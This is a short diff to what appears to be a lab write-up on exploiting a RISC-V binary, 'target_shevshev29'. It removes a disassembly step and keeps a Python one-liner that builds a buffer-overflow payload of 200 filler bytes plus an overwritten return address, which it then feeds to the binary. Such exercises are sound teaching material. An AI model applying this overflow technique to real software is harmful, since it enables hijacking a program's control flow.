@@ -49,9 +49,7 @@ Segmentation fault (core dumped)
 
 ### part b
 Run the below commands
-```
-riscv64-linux-gnu-objdump -d ./target_shevshev29 | grep -A 60 "<main>"
-```
+
 ```
 python3 -c "import struct; import sys; sys.stdout.buffer.write(b'A'*200 + struct.pack('<Q', 0x104e8))" > payload
 ./target_shevshev29 < payload
